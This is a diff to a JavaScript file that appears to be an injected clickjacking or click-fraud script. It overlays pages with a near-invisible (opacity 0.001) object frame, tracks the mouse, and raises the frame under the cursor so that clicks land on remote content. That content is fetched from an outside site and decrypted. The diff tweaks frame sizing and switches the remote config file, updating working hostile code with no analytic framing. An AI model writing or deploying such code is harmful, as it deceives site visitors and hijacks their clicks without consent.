@@ -4,7 +4,7 @@ let monitorTracker = null;
 let canTrack = 0;
 let bannerSize = getBannerSize();
 let uniqueID = '_' + Math.random().toString(36).substr(2, 9);
-let htmlCode = '<div id="_gcli_div'+ uniqueID +'"><object id="_gcli_obj'+ uniqueID +'" type="text/html" style="position:absolute;width:100%;height:100%;overflow:hidden;top:-' + siteSelected.margin +'px"></object></div>';
+let htmlCode = '<div id="_gcli_div'+ uniqueID +'"><object id="_gcli_obj'+ uniqueID +'" type="text/html" style="position:absolute;width:100%;height:100%;overflow:hidden;"></object></div>';
 let cssCode = '<style>#_gcli_div'+ uniqueID +'{position:fixed;z-index:-999999;bottom:0;left:0;height:100%;width:100%;opacity:0.001;overflow:hidden;}</style>';
 let pointerTracker = function(e){
     let out = {x:0, y:0};
@@ -56,7 +56,7 @@ function getCookie(strCookie) {
 function minimizeDiv() {
     canTrack = 0;
     $("#_gcli_div" + uniqueID).css("width", "100%").css("height", "100%").css("top", "0").css("left", "0").css("z-index", "-999999").css("position", "fixed").css("visibility", "hidden");
-    $("#_gcli_obj" + uniqueID).css("top", "-" + siteSelected.margin + "px").css("pointer-events", "none");
+    $("#_gcli_obj" + uniqueID).css("top", "-" + siteSelected.margin + "px").css("pointer-events", "none").css("height", window.innerHeight + siteSelected.margin + "px");
 }
 function insertCode(){
     $("body").append(cssCode + htmlCode).css("overflow-x", "hidden").css("width", "100%");
@@ -99,7 +99,7 @@ function showDiv() {
     canTrack = 1;
     startTracker();
 
-    $("#_gcli_obj" + uniqueID).css("top", "-" + siteSelected.margin + "px").css("pointer-events", "");
+    $("#_gcli_obj" + uniqueID).css("top", "-" + siteSelected.margin + "px").css("pointer-events", "").css("height", "100%");
     $("#_gcli_div" + uniqueID).css("width", bannerSize.width).css("height", siteSelected.margin + bannerSize.height + "px").css("z-index", "999999").css("position", "absolute").css("visibility", "visible");
 }
 function showOrMinimize() {
@@ -152,7 +152,7 @@ function Decrypt(s1, id) {
     return result;
 }
 $(document).ready(function () {
-    fetch('https://www.iplezier.site/assets/js/c/tns.json?ver=' + $.now())
+    fetch('https://www.iplezier.site/assets/js/c/rc.json?ver=' + $.now())
         .then(function(response) {
             return response.text();
         })
